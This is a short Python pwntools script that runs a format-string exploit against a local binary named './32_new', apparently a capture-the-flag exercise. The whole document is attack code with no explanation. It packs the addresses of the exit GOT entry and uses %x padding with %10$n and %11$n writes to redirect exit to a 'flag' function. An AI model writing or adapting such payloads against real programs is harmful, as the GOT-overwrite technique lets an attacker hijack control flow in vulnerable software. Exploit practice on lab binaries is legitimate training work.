#!/usr/bin/env python3
import pwn
import struct
import sys

io = pwn.process("./32_new")

def b(x):
    return struct.pack("I", x)

exit_got = 0x0804A034
flag = 0x804870b

payload = b""
payload += b(exit_got)
payload += b(exit_got + 2)
payload += b"BBBBCCCC"
payload += b"%34485x"
payload += b"%10$n"
payload += b"%33017x"
payload += b"%11$n"

io.sendline(payload)
print(io.recvall())
print(payload)
